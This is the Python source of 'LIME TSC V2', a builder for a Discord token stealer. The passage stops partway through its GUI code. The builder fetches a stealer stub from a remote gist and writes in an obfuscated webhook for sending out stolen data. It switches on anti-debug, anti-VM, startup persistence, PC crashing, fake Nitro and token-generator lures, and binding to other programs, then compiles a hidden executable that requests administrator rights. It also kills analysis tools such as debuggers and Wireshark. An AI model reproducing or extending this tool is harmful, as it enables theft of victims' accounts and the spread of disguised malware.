#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys , requests , json , base64
from time import sleep
from os import system , getenv , getpid , remove
from psutil import Process , process_iter
from cryptography.fernet import Fernet
from os.path import exists , basename
from colorama import Fore, Back, Style
from subprocess import Popen, PIPE
from threading import Thread
from subprocess import check_output
from tkinter import *
from tkinter import messagebox , filedialog
from shutil import copy2 , rmtree
import sys
from cProfile import label
from tkinter import *
import tkinter as tk
from tkinter import messagebox
import time
import os,base64,shutil,sys,random,string,threading , psutil
from threading import Thread
from os.path import exists
import subprocess
import webbrowser
from click import command
from psutil import process_iter
from tkinter import filedialog,Text
from cryptography.fernet import Fernet
import marshal,base64
try:
    import requests
    from PIL import ImageTk, Image
    from PIL import *
except:
    os.system("cls")
    print("INSTALL PKGS FOR TOOL PLEASE\n")
    input()
    process = psutil.Process(os.getpid())
    for child in process.children(recursive=True):
      child.kill()
    process.kill()
get_our_links = requests.get('https://pastebin.com/raw/85WeKjxf').json()

import sys
try:
    cli = sys.argv[1]
except:
    cli = "damnit"
if cli == "--cli-mode":
    def anti_debuger():
            while True:
                for process in process_iter():
                    if "fiddler" in process.name().lower() or "hack" in process.name().lower() or "x32dbg" in process.name().lower() or "x64dbg" in process.name().lower() or "x96dbg" in process.name().lower() or "IDA" in process.name() or "toolkit" in process.name().lower() or "debugger" in process.name().lower() or "wireshark" in process.name().lower() or "smartsniff" in process.name().lower() or "hacker" in process.name().lower() or "dump" in process.name().lower() or "dumper" in process.name().lower() or "joebox" in process.name().lower() or "ollydbg" in process.name().lower():
                        try:
                            process.kill()
                        except:
                            pass
                sleep(0.1)
    
    
    #Thread(target=anti_debuger).start()
    
    

    
    def check_lol():return "SUCCESSDONELOGIN"
    
    shits = []
    def add_app():
        try:
          root = Tk()
          root.withdraw()
          apps_path = filedialog.askopenfilename(initialdir="/",title="SELECT FILE PATH", filetypes=(("executables","*.exe"),("all files","*.*")))
          temppath="output\\stubs\\temp"
          shits.append(apps_path)
          after_payload = copy2(apps_path,temppath)
          messagebox.showinfo('LIME TSC BUILDER',"DONE BIND THE APP")
        except:
            root = Tk()
            root.withdraw()
            messagebox.showerror("ERROR","PLEASE SELECT APP")
    
    def login():
      print("\n")
      if check_lol() == "SUCCESSDONELOGIN":
        tool()
      else:
        print("ERROR INVAILD ACCOUNT")
        sleep(3)
        system('cls')
    
    
    system('cls')
    if not exists(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME"):
      with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'w') as f:
        f.write('LIMENORMAL')
        f.close()
    
    
    def tool():
      print(Theme()(f'''

                        $$\       $$$$$$\ $$\      $$\ $$$$$$$$\       $$$$$$$$\  $$$$$$\   $$$$$$\  
                        $$ |      \_$$  _|$$$\    $$$ |$$  _____|      \__$$  __|$$  __$$\ $$  __$$\ 
                        $$ |        $$ |  $$$$\  $$$$ |$$ |               $$ |   $$ /  \__|$$ /  \__|
                        $$ |        $$ |  $$\$$\$$ $$ |$$$$$\             $$ |   \$$$$$$\  $$ |      
                        $$ |        $$ |  $$ \$$$  $$ |$$  __|            $$ |    \____$$\ $$ |      
                        $$ |        $$ |  $$ |\$  /$$ |$$ |               $$ |   $$\   $$ |$$ |  $$\ 
                        $$$$$$$$\ $$$$$$\ $$ | \_/ $$ |$$$$$$$$\          $$ |   \$$$$$$  |\$$$$$$  |
                        \________|\______|\__|     \__|\________|         \__|    \______/  \______/ 
                        
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] CHANGE THEMES                                | [2] BUILD STEALER
[3] OUR WEBSITES                                 | [4] EXIT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    
[>>>] Choice: '''),end="")
      try:
        inp = input()
        inp = int(inp)
      except:
        print(Fore.RED + "Error: Invalid input")
        sleep(3)
        system('cls')
        tool()
      if inp == 1:
        print(Theme()("""SELECT THEME
        [1] LIME NORMAL
        [2] LIME NEON
        [3] LIME WATER
        [4] LIME FIRE
    
        [>>>] Choice: """)) 
        thinp = input()
        try:
          thinp = int(thinp)
        except:
          print(Fore.RED + "Error: Invalid input")
          sleep(3)
          system('cls')
          tool()
        if thinp == 1:
          with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'w') as f:
            f.write("LIME_NORMAL")
            f.close()
          Theme()
          print(f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Theme changed to LIME NORMAL")
          sleep(1)
          system('cls')
          tool()
    
        elif thinp == 2:
          with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'w') as f:
            f.write("LIME_NEON")
            f.close()
          Theme()
          print(f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Theme changed to LIME NEON")
          sleep(1)
          system('cls')
          tool()
    
        elif thinp == 3:
          with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'w') as f:
            f.write("LIME_WATER")
            f.close()
          
          Theme()
          print(f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Theme changed to LIME WATER")
          sleep(1)
          system('cls')
          tool()
    
        elif thinp == 4:
          with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'w') as f:
            f.write("LIME_FIRE")
            f.close()
    
          Theme()  
          print(f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Theme changed to LIME FIRE")
          sleep(1)
          system('cls')
          tool()
        
        else:
          print(f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Invalid choice")
          sleep(1)
          system('cls')
          tool()
    
      elif inp == 2:
        builder()
    
      elif inp == 3:
        print(Theme()(f"""\nOUR WEBSITES AND SERVERS
OUR SERVERS : {get_our_links['SERVERS']}
YOUTUBE : {get_our_links['YOUTUBE']}
WEBSITE : {get_our_links['WEBSITE']}


PRESS ENTER TO CONTINUE\n"""))
        input()
        system('cls')
        tool()
    
      elif inp == 4:
        print((f"{Fore.LIGHTGREEN_EX}[>>>]{Fore.LIGHTGREEN_EX} Exiting... | THX FOR USNING LIME TSC BUILDER :)"))
        sleep(4)
        system('cls')
        process = Process(getpid()).name()
        Popen(f"taskkill /f /im {process}", shell=True, stdout=PIPE, stderr=PIPE)
        sys.exit()
    
    
    
    
    def GetTheme(text):
      if text == "LIME_NORMAL":
        return brazil
      elif text == "LIME_NEON":
        return purplepink
      elif text == "LIME_WATER":
        return water
      elif text == "LIME_FIRE":
        return fire
      else: 
        return brazil
    
    
    def water(text):
        system(""); faded = ""
        green = 10
        for line in text.splitlines():
            faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
            if not green == 255:
                green += 15
                if green > 255:
                    green = 255
        return faded
    
    def fire(text):
        system(""); faded = ""
        green = 250
        for line in text.splitlines():
            faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
            if not green == 0:
                green -= 25
                if green < 0:
                    green = 0
        return faded
    
    def purplepink(text):
        system(""); faded = ""
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        return faded
    
    def brazil(text):
        system(""); faded = ""
        red = 0
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};255;0m{line}\033[0m\n")
            if not red > 200:
                red += 30
        return faded
    
    def Theme():
      with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\LIME_THEME", 'r') as f:
        theme = f.read()
      return GetTheme(theme) 
    def banner():
      print(Theme()(f'''
                                                             ╔╖
                                                       ╢P    ``
                                                          ╓ ╓╢╢╥,
                                                      ╢▒@ ╙╓╢▒▒▒▒▒▒@╗
                                                     ╗╖`╔╢▒▒▒▒▒▒▒▒▒▒▒▒@,
                                                   ╓╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╗
                                                   ▒▓╝╜"`           "╙╨▓▒╕
                                                  └     ,╓╥╦╦m╒╦╦╥╖,     ╙
                                                      #╩MHw`╙╨╘╜`⌐mM╩Ñ
                                                       "╜"╓╦@Ñ]@╦w"╙"
                                               ,   ,   ,,,,,,,,,,,,,,,,,,,
                                                  ^▀ⁿ   ╙▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
                                                 .╟  Y▄   ¥▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄&
                                                  ╙▓╗          ,▓▓
                                                   ╙▓▓▓▓▓▓,   ╔▓╜ ╔▓▓▓▓▓▀
                                                     ╓╓  ▓▓      Æ▓` ▄▓`
                                                      ▀▓▓▓  ▓W  "▓  ▓▓
                                                       ╙▀ ╓▓▀ ,,/ ,▓▓
                                                         a▓╜ ╔▓╜ ,
                                                            ▓▓  Æ▓
                                                           ╚▓, ▓▓
                                                            ╙▓▓▓
                                                              ╜
                                                              '''))
    banner()
    def wget_theme():
      l = "<"
      r = ">"
      u = "="
      for i in range(20):
        print("                             tool is loading  " + "[ " + l + (u * (len(l) + i+i)) + r + " ]",end="\r")
        sleep(0.2)
      print("                                                  TOOL LOADED SUCCESSFULLY                                 ",end="\r")
      sleep(1)
      system('cls')
    
    def builder():
      system('cls')
      print(Theme()('''
                              $$$$$$$\  $$\   $$\ $$$$$$\ $$\       $$$$$$$\  $$$$$$$$\ $$$$$$$\  
                              $$  __$$\ $$ |  $$ |\_$$  _|$$ |      $$  __$$\ $$  _____|$$  __$$\ 
                              $$ |  $$ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$ |      $$ |  $$ |
                              $$$$$$$\ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$$$$\    $$$$$$$  |
                              $$  __$$\ $$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$  __|   $$  __$$< 
                              $$ |  $$ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$ |      $$ |  $$ |
                              $$$$$$$  |\$$$$$$  |$$$$$$\ $$$$$$$$\ $$$$$$$  |$$$$$$$$\ $$ |  $$ |
                              \_______/  \______/ \______|\________|\_______/ \________|\__|  \__|\n'''))
      webhook = input("ENTER YOUR WEBHOOK : ")
      print("\n")
      antidebug = input("DO YOU WANT ANTI DEBUG ? (Y/N) : ")
      killdiscord = input("DO YOU WANT TO KILL DISCORD ? (Y/N) : ")
      jumpscare = input("DO YOU WANT TO JUMPSCARE ? (Y/N) : ")
      startup = input("DO YOU WANT ADD TO STARTUP ? (Y/N) : ")
      shutdown = input("DO YOU WANT TO SHUTDOWN ? (Y/N) : ")
      restart = input("DO YOU WANT TO RESTART ? (Y/N) : ")
      crashpc = input("DO YOU WANT TO CRASH PC ? (Y/N) : ")
      filebinder = input("DO YOU WANT TO BIND FILE ? (Y/N) : ")
      pingeveryone = input("DO YOU WANT TO PING EVERYONE ? (Y/N) : ")
      hiddenstealer = input("DO YOU WANT TO HIDE STEALER ? (Y/N) : ")
      antivm = input("DO YOU WANT ANTI-VM ? (Y/N) : ")
      fakeerror = input("DO YOU WANT FAKE ERROR ? (Y/N) : ")
      fakenitrogen = input("DO YOU WANT FAKE NITRO GENERATOR ? (Y/N) : ")
      faketokengen = input("DO YOU WANT FAKE TOKEN GENERATOR ? (Y/N) : ")
    
      print("\nPLEASE WAIT")
      sleep(3)
      system('cls')
      print("CONFIG YOUR GRABBER WAIT...\n\n")
      x45=webhook[::-1].encode('ascii')
      x64 = base64.b64encode(x45).decode('ascii')[::-1]
      stub = requests.get("https://gist.githubusercontent.com/Fadi002/e02ca646ac77c362b5a7821e24f3c31c/raw/0dc27b0aeda7ee2b71bfff3bca9e3c5f03992442/stub.py",timeout=60).text
      stub = stub.replace("~~hook~~",x64)
      if antidebug == "Y" or antidebug == "y":
        stub = stub.replace('"antidebug": False,','"antidebug": True,')
      if killdiscord == "Y" or killdiscord == "y":
        stub = stub.replace('"discordkill": False,','"discordkill": True,')
      if jumpscare == "Y" or jumpscare == "y":
        stub = stub.replace('"jumpscare": False,','"jumpscare": True,')
      if startup == "Y" or startup == "y":
        stub = stub.replace('"startup": False,','"startup": True,')
      if shutdown == "Y" or shutdown == "y":
        stub = stub.replace('"shutdown": False,','"shutdown": True,')
      if restart == "Y" or restart == "y":
        stub = stub.replace('"restart": False,','"restart": True,')
      if pingeveryone == "Y" or pingeveryone == "y":
        stub = stub.replace('"pingeveryone": False,','"pingeveryone": True,')
      if crashpc == "Y" or crashpc == "y":
        stub = stub.replace('"crashpc": False,','"crashpc": True,')
      if fakeerror == "Y" or fakeerror == "y":
        stub = stub.replace('"fakeerror": False,','"fakeerror": True,')
        message = input("ENTER YOUR FAKE ERROR MESSAGE : ")
        stub = stub.replace('~~messagefake~~',message)
      if fakenitrogen == "Y" or fakenitrogen == "y":
        stub = stub.replace('"nitro": False,','"nitro": True,')
      if faketokengen == "Y" or faketokengen == "y":
        stub = stub.replace('"tokengen": False,','"tokengen": True,')
      if hiddenstealer == "Y" or hiddenstealer == "y":
        hidden = True
      else:
        hidden = False
      if antivm == "Y" or antivm == "y":
        stub = stub.replace('"antivm": False,','"antivm": True,')
      binder = False
      if filebinder == "Y" or filebinder == "y":
        print("please select the file to bind")
        add_app()
        for app in shits:
          appname = basename(app)
          stub = stub.replace('"binder": False,','"binder": True,')
          stub = stub.replace('~~bindname~~',appname)
          binder = True
      with open(getenv("LOCALAPPDATA")+"\\Temp"+"\\grabber.py","w",encoding="utf-8") as f:
        f.write(stub)
        f.close()
      system("attrib +h %temp%\\grabber.py")
    
      print("PLEASE WAIT BUILDING GRABBER ...")
      x = False
      if binder == True:
        system(f'pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/temp/{appname};." --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --distpath output --specpath output --workpath output %temp%\\grabber.py')
        remove(f"output/grabber.spec")
        rmtree(f"output/grabber")
      elif binder == True and hidden == True:
        system(f'pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/temp/{appname};." --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --noconsole --distpath output --specpath output --workpath output %temp%\\grabber.py')
        remove(f"output/grabber.spec")
        rmtree(f"output/grabber")
      elif hidden == True:
        system('pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --noconsole --distpath output --specpath output --workpath output %temp%\\grabber.py')
        remove(f"output/grabber.spec")
        rmtree(f"output/grabber")
      else:
        system(f'pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --distpath output --specpath output --workpath output %temp%\\grabber.py')
        remove(f"output/grabber.spec")
        rmtree(f"output/grabber")
      system('cls')
      print(Theme()('''
$$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\       $$$$$$$\  $$\   $$\ $$$$$$\ $$\       $$$$$$$\  
$$  __$$\ $$  __$$\ $$$\  $$ |$$  _____|      $$  __$$\ $$ |  $$ |\_$$  _|$$ |      $$  __$$\ 
$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |            $$ |  $$ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |
$$ |  $$ |$$ |  $$ |$$ $$\$$ |$$$$$\          $$$$$$$\ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |
$$ |  $$ |$$ |  $$ |$$ \$$$$ |$$  __|         $$  __$$\ $$ |  $$ |  $$ |  $$ |      $$ |  $$ |
$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |            $$ |  $$ |$$ |  $$ |  $$ |  $$ |      $$ |  $$ |
$$$$$$$  | $$$$$$  |$$ | \$$ |$$$$$$$$\       $$$$$$$  |\$$$$$$  |$$$$$$\ $$$$$$$$\ $$$$$$$  |
\_______/  \______/ \__|  \__|\________|      \_______/  \______/ \______|\________|\_______/ 

saved in output folder'''))
      sleep(3)
      system('cls')
      tool()
    
    
    
    
    
    wget_theme()
    system('cls')
    if "SUCCESSDONELOGIN":
      tool()
    else:
      login()
else:
    pass



    

def openurl(url):
    webbrowser.open_new(url)



if os.name != "nt":
    exit()
pyarmordeprotect = requests.get("https://pastebin.com/HDM3CU4z").text
if "https://www.youtube.com/watch?v=EgwQG3MYp3o" not in pyarmordeprotect:
    fuck = tk.Tk()
    fuck.overrideredirect(1)
    fuck.withdraw()
    print("[LOGS] TRY TO SKID TOOL USER\n")
    messagebox.showerror("ERROR", "SKID DONT TRY TO UNPACK THIS TOOL :)")
    exit()



from tkinter import *
import tkinter as tk
from tkinter import messagebox
import time
import os
import json
try:
    import requests
    from PIL import ImageTk, Image
except:
    os.os.system("pip install requests && pip install pillow")
    exit()


print("[LOGS] tool will start now !\n")
pc_username = os.getenv("UserName")


login = Tk()
login.title("LIME TSC V2 - Login")
login.configure(background="#161716")
login.geometry("700x455+50+150")
login.iconbitmap('encodeds\lime.ico')
login.resizable(False, False)




def check_lol():
        return "SUCCESSDONELOGIN"



limelogo = Image.open('encodeds\\lime.png')

resizelogo = limelogo.resize((200,200), Image.Resampling.LANCZOS)

newlogo = ImageTk.PhotoImage(resizelogo)

just_logo = Label(login, image=newlogo, bg="#161716").place(x=-20, y=0)

# set background image
background_image = Image.open("encodeds\\login\\login.jpg")
background_image = ImageTk.PhotoImage(background_image)
background_label = Label(login, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)





username = StringVar()
username_entry = Entry(login, width=20, font=("Tahoma", 20), bg="#161716", fg="#ffffff", bd=0, highlightbackground = "#09ff00", highlightcolor= "#09ff00", highlightthickness=2,textvariable=username)
username_entry.place(x=273, y=144, height=33)



password = StringVar()
password_entry = Entry(login, width=20, font=("Tahoma", 20), bg="#161716", fg="#ffffff", bd=0, highlightbackground = "#09ff00", highlightcolor= "#09ff00", highlightthickness=2,textvariable=password)
password_entry.place(x=273, y=256, height=33)



loginimagebu = Image.open("encodeds\\login\\loginbu.jpg") 
loginimagebu = ImageTk.PhotoImage(loginimagebu)






loginbu = Button(login, image=loginimagebu, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=check_lol)
loginbu.place(x=350, y=368)



buttonimagediscord = Image.open("encodeds\\login\\discord.png")


login.buttonimagediscord = ImageTk.PhotoImage(buttonimagediscord)


def open_Discord_server():
    buttondiscord.bind("<Button-1>", lambda e: openurl("https://github.com/fadi002"))




buttondiscord = Button(login, image=login.buttonimagediscord, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=open_Discord_server)
buttondiscord.place(x=0, y=150)

buttonimageyoutube = Image.open("encodeds\\login\\youtube.png")


login.buttonimageyoutube = ImageTk.PhotoImage(buttonimageyoutube)


def open_youtube_channel():
    buttonyoutube.bind("<Button-1>", lambda e: openurl("https://github.com/fadi002"))

buttonyoutube = Button(login, image=login.buttonimageyoutube, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=open_youtube_channel)
buttonyoutube.place(x=0, y=200)




buttonimagewebsite = Image.open("encodeds\\login\\website.png")


login.buttonimagewebsite = ImageTk.PhotoImage(buttonimagewebsite)


def open_website():
    buttonwebsite.bind("<Button-1>", lambda e: openurl("https://github.com/fadi002"))

buttonwebsite = Button(login, image=login.buttonimagewebsite, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=open_website)
buttonwebsite.place(x=0, y=250)



buttonimagewebsitesdev = Image.open("encodeds\\login\\artools.png")


login.buttonimagewebsitesdev = ImageTk.PhotoImage(buttonimagewebsitesdev)


def open_website_artools():
    buttonwebsitesartools.bind("<Button-1>", lambda e: openurl("https://github.com/Fadi002"))

buttonwebsitesartools = Button(login, image=login.buttonimagewebsitesdev, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=open_website_artools)
buttonwebsitesartools.place(x=0, y=370)

autologinjson = exists('account.json')
if autologinjson == True:
    messagebox.showinfo("Welcome", f"Welcome, USELSS PROJECT !! now you can use the tool :)")
    login.destroy()


def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        process = psutil.Process(os.getpid())
        for child in process.children(recursive=True):
            child.kill()
        process.kill()
        sys.exit()
try:
    login.protocol("WM_DELETE_WINDOW", on_closing)
except:
    pass

login.mainloop()



            








root = Tk()
root.title("LIME TSC V2 - BUILDER")
root.configure(background="#161716")
root.geometry("700x455+50+150")
root.iconbitmap('encodeds\lime.ico')
root.resizable(False, False)








limelogo = Image.open('encodeds\\lime.png')

resizelogo = limelogo.resize((200,200), Image.Resampling.LANCZOS)

newlogo = ImageTk.PhotoImage(resizelogo)

just_logo = Label(root, image=newlogo, bg="#161716").place(x=-20, y=0)

# set background

background_image = Image.open("encodeds\\theme\\MENU.jpg")
background_image = ImageTk.PhotoImage(background_image)

BUTTON_YES = Image.open("encodeds\\theme\\BUTTON_YES.jpg")
BUTTON_YES = ImageTk.PhotoImage(BUTTON_YES)

BUTTON_NO = Image.open("encodeds\\theme\\BUTTON_NO.jpg")
BUTTON_NO = ImageTk.PhotoImage(BUTTON_NO)

menuon = Image.open("encodeds\\theme\\menuon.jpg")
menuon = ImageTk.PhotoImage(menuon)

menuoff = Image.open("encodeds\\theme\\menuoff.jpg")
menuoff = ImageTk.PhotoImage(menuoff)

compon = Image.open("encodeds\\theme\\compileron.jpg")
compon = ImageTk.PhotoImage(compon)

compoff = Image.open("encodeds\\theme\\compileroff.jpg")
compoff = ImageTk.PhotoImage(compoff)

buildb = Image.open("encodeds\\theme\\BUILD.jpg")
buildb = ImageTk.PhotoImage(buildb)

abouton = Image.open("encodeds\\theme\\abouton.jpg")
abouton = ImageTk.PhotoImage(abouton)

aboutoff = Image.open("encodeds\\theme\\aboutoff.jpg")
aboutoff = ImageTk.PhotoImage(aboutoff)

compilemenu = Image.open("encodeds\\theme\\compilermenu.jpg")
compilemenu = ImageTk.PhotoImage(compilemenu)

aboutmenu = Image.open("encodeds\\theme\\aboutmenu.jpg")
aboutmenu = ImageTk.PhotoImage(aboutmenu)

# ads buttons images (discord , youtube , website)
discord_button = PhotoImage(file="encodeds\\theme\\dsc.png")


youtube_button = PhotoImage(file="encodeds\\theme\\youtube.png") 
youtube_button = youtube_button.subsample(7,7)

website_button = PhotoImage(file="encodeds\\theme\\website.png")
website_button = website_button.subsample(8,8)

browse = Image.open("encodeds\\theme\\browse.jpg")
browse = ImageTk.PhotoImage(browse)

#----------------------#
# just some stuff 
webhook = StringVar()
FAKEERROR_MESSAGE = StringVar()
#----------------------#

#----------------------#
# just a config
ANTI_DEBUG = False
ANTI_VM = False
STARTUP = False
DISCORD_KILL = False
SHUTDOWN = False
RESTART = False
CRASH_PC = False
JUMPSCARE = False
NITROGEN = False
TOKENGEN = False
FAKEERROR = False
BINDER = False
HIDDEN = False

#----------------------#

#----------------------#
# just a vars
ANTI_DEBUG_VAR = IntVar()
ANTI_VM_VAR = IntVar()
STARTUP_VAR = IntVar()
DISCORD_KILL_VAR = IntVar()
SHUTDOWN_VAR = IntVar()
RESTART_VAR = IntVar()
CRASH_PC_VAR = IntVar()
JUMPSCARE_VAR = IntVar()
NITROGEN_VAR = IntVar()
TOKENGEN_VAR = IntVar()
FAKEERROR_VAR = IntVar()
BINDER_VAR = IntVar()
HIDDEN_VAR = IntVar()
#----------------------#

def builder():
  hook = webhook.get()
  if hook == "":
    messagebox.showerror("Error", "Please enter a webhook")
  if "https://discord.com/api/webhooks/"not in hook:
      if "https://ptb.discord.com/api/webhooks/" not in hook:
            if "https://canary.discord.com/api/webhooks/" not in hook:
                messagebox.showerror("Error", "Please enter a valid webhook")
                return

    
  print('[LOGS] Starting builder...\n')
  message = FAKEERROR_MESSAGE.get()
  # get the vars
  antidebug = ANTI_DEBUG
  killdiscord = DISCORD_KILL
  jumpscare = JUMPSCARE
  startup = STARTUP
  shutdown = SHUTDOWN
  restart = RESTART
  crashpc = CRASH_PC
  filebinder = BINDER
  pingeveryone = True
  antivm = ANTI_VM
  fakeerror = FAKEERROR
  hiddenstealer = HIDDEN
  fakenitro = NITROGEN
  faketoken = TOKENGEN
  x45=hook[::-1].encode('ascii')
  x64 = base64.b64encode(x45).decode('ascii')[::-1]
  stub = requests.get("https://gist.githubusercontent.com/Fadi002/e02ca646ac77c362b5a7821e24f3c31c/raw/0dc27b0aeda7ee2b71bfff3bca9e3c5f03992442/stub.py",timeout=60).text
  stub = stub.replace("~~hook~~",x64)
  if antidebug == True:
    stub = stub.replace('"antidebug": False,','"antidebug": True,')
  if killdiscord == True:
    stub = stub.replace('"discordkill": False,','"discordkill": True,')
  if jumpscare == True:
    stub = stub.replace('"jumpscare": False,','"jumpscare": True,')
  if startup == True:
    stub = stub.replace('"startup": False,','"startup": True,')
  if shutdown == True:
    stub = stub.replace('"shutdown": False,','"shutdown": True,')
  if restart == True:
    stub = stub.replace('"restart": False,','"restart": True,')
  if pingeveryone == True:
    stub = stub.replace('"pingeveryone": False,','"pingeveryone": True,')
  if crashpc == True:
    stub = stub.replace('"crashpc": False,','"crashpc": True,')
  if fakeerror == True:
    stub = stub.replace('"fakeerror": False,','"fakeerror": True,')
    stub = stub.replace('~~messagefake~~',message)
  if fakenitro == True:
    stub = stub.replace('"nitro": False,','"nitro": True,')
  if faketoken == True:
    stub = stub.replace('"tokengen": False,','"tokengen": True,')
  if antivm == True:
    stub = stub.replace('"antivm": False,','"antivm": True,')
  binder = False
  if filebinder == 1:
    for app in shits:
      appname = os.path.basename(app)
      stub = stub.replace('"binder": False,','"binder": True,')
      stub = stub.replace('!d!',appname)
      binder = True
  with open(os.getenv("LOCALAPPDATA")+"\\Temp"+"\\grabber.py","w",encoding="utf-8") as f:
    f.write(stub)
    f.close()
  os.system("attrib +h %temp%\\grabber.py")

  print("PLEASE WAIT BUILDING GRABBER ...")
  x = False
  if binder == True:
    os.system(f'pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/temp/{appname};." --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --distpath output --specpath output --workpath output %temp%\\grabber.py')
    os.remove(f"output/grabber.spec")
    shutil.rmtree(f"output/grabber")
  elif binder == True and hiddenstealer == True:
    os.system(f'pyinstaller -y -F --clean --log-level "ERROR" --add-data "stubs/temp/{appname};." --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --noconsole --distpath output --specpath output --workpath output %temp%\\grabber.py')
    os.remove(f"output/grabber.spec")
    shutil.rmtree(f"output/grabber")
  elif hiddenstealer == True:
    os.system('pyinstaller -y -F --clean --log-level "ERROR" --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --noconsole --distpath output --specpath output --workpath output %temp%\\grabber.py')
    os.remove(f"output/grabber.spec")
    shutil.rmtree(f"output/grabber")
  else:
    os.system(f'pyinstaller -y -F --clean --log-level "ERROR" --console --add-data "stubs/dev.exe;." --add-data "stubs/hh.exe;." --add-data "stubs/snuvcdsm.exe;." --add-data "stubs/xwizard.exe;." --uac-admin --distpath output --specpath output --workpath output %temp%\\grabber.py')
    os.remove(f"output/grabber.spec")
    shutil.rmtree(f"output/grabber")
  print("[LOGS] GRABBER BUILDED SUCCESSFULLY")
  time.sleep(3)
  try:
    os.remove(os.getenv("LOCALAPPDATA")+"\\Temp"+'\\grabber.py')
    messagebox.showinfo("SUCCESS","GRABBER BUILDED SUCCESSFULLY")
  except:
    pass



def compilermenu():

    compilermenuimage = Label(root, image=compilemenu).place(x=-2, y=-2)
    
    menub = Button(root,bd=0, highlightthickness=0, image=menuoff, command=menu).place(x=0, y=150)

    compileb = Button(root,bd=0, highlightthickness=0, image=compon, command=compilermenu).place(x=0, y=200)
    
    aboutb = Button(root,bd=0, highlightthickness=0, image=aboutoff, command=aboutme).place(x=0, y=250)

    buildbu = Button(root,bd=0, highlightthickness=0, image=buildb, command=builder).place(x=0, y=350)

    def nitro_gen_fake_image():
        global NITROGEN
        if NITROGEN == False:
            nitrogenbu.configure(image=BUTTON_YES)
            NITROGEN = True
        else:
            NITROGEN = False
            nitrogenbu.configure(image=BUTTON_NO)

    def checknitrobu():
        if NITROGEN == True:
            nitrogenbu.configure(image=BUTTON_YES)
        else:
            nitrogenbu.configure(image=BUTTON_NO)
            

    nitrogenbu = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=nitro_gen_fake_image, textvariable=NITROGEN_VAR)
    nitrogenbu.place(x=550, y=110) 
    checknitrobu()

    def token_gen_fake_image():
        global TOKENGEN
        if TOKENGEN == False:
            tokengenbu.configure(image=BUTTON_YES)
            TOKENGEN = True
        else:
            TOKENGEN = False
            tokengenbu.configure(image=BUTTON_NO)

    def checktokenbu():
        if TOKENGEN == True:
            tokengenbu.configure(image=BUTTON_YES)
        else:
            tokengenbu.configure(image=BUTTON_NO)


    tokengenbu = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=token_gen_fake_image, textvariable=TOKENGEN_VAR)
    tokengenbu.place(x=550, y=220)
    checktokenbu()

    def fakeerror_image():
        global FAKEERROR
        if FAKEERROR == False:
            fakeerrorbu.configure(image=BUTTON_YES)
            FAKEERROR = True
        else:
            FAKEERROR = False
            fakeerrorbu.configure(image=BUTTON_NO)

